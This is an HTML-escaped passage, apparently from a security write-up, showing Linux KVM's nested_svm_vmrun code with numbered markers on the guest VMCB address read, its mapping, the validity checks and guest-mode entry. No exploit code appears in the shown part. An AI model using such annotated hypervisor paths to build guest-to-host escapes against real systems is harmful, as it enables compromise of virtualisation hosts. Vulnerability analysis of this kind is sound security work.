id="t.4603a0181df4522e440958d55a04b47d07a005d3"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c19"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_vmrun&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;hsave &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;hsave&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vmcb &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_host_map map&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u64 vmcb12_gpa&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12_gpa &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rax&lt;/span&gt;&lt;span class="c1"&gt;; &lt;/span&gt;&lt;span class="c37 c18"&gt;** &lt;/span&gt;&lt;span class="c15"&gt;1&lt;/span&gt;&lt;span class="c18 c37"&gt;&amp;nbsp;**&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ret &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_vcpu_map&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;gpa_to_gfn&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vmcb12_gpa&lt;/span&gt;&lt;span class="c1"&gt;),&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;map&lt;/span&gt;&lt;span class="c1"&gt;); &lt;/span&gt;&lt;span class="c37 c18"&gt;** &lt;/span&gt;&lt;span class="c15"&gt;2&lt;/span&gt;&lt;span class="c37 c18"&gt;&amp;nbsp;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;hellip; &lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ret &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_skip_emulated_instruction&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12 &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;hva&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c3"&gt;nested_vmcb_checks&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{ ** &lt;/span&gt;&lt;span class="c15"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SVM_EXIT_ERR&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code_hi &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_info_1 &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmcb12&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_info_2 &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;goto&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;out&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c22"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Save the old vmcb, so we don&amp;#39;t need to pick what we save, but can&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* restore everything when a VMEXIT occurs&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;es &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;es&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cs &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cs&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ss &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ss&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ds &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ds&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;gdtr &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;gdtr&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;idtr &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;idtr&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;efer &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;arch&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;efer&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr0 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_read_cr0&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr4 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;arch&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rflags &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_get_rflags&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rip &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_rip_read&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rsp &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rsp&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rax &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;rax&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;npt_enabled&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr3 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;else&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;save&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;cr3 &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_read_cr3&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; copy_vmcb_control_area&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;hsave&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;nested_run_pending &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;enter_svm_guest_mode&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12_gpa&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmcb12&lt;/span&gt;&lt;span class="c1"&gt;)) ** &lt;/span&gt;&lt;span class="c15"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;goto&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;out_exit_err&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span 